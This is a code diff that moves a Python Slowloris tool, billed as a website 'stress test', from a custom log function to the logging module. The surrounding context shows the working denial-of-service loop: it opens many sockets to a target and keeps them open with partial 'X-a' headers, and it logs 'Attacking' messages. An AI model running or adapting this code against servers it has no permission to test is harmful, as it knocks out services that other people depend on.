@@ -1,4 +1,4 @@
-import socket, random, time, sys, argparse, random
+import socket, random, time, sys, argparse, random, logging
 
 parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
 parser.add_argument('host',  nargs="?", help="Host to preform stress test on")
@@ -20,13 +20,9 @@ if not args.host:
     sys.exit(1)
 
 if args.verbose == True:
-    log_level = 2
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
 else:
-    log_level = 1
-
-def log(text, level=1):
-    if log_level > level:
-        print(text)
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
 
 list_of_sockets = []
 user_agents = [
@@ -72,19 +68,19 @@ def init_socket(ip):
 def main():
     ip = args.host
     socket_count = args.sockets
-    log("Attacking {} with {} sockets.".format(ip, socket_count))
+    logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
-    log("Creating sockets...")
+    logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
-            log("Creating socket nr {}".format(_), level=2)
+            logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
         except socket.error:
             break
         list_of_sockets.append(s)
 
     while True:
-        log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
+        logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
@@ -92,7 +88,7 @@ def main():
                 list_of_sockets.remove(s)
 
         for _ in range(socket_count - len(list_of_sockets)):
-            log("Recreating socket...")
+            logging.debug("Recreating socket...")
             try:
                 s = init_socket(ip)
                 if s:
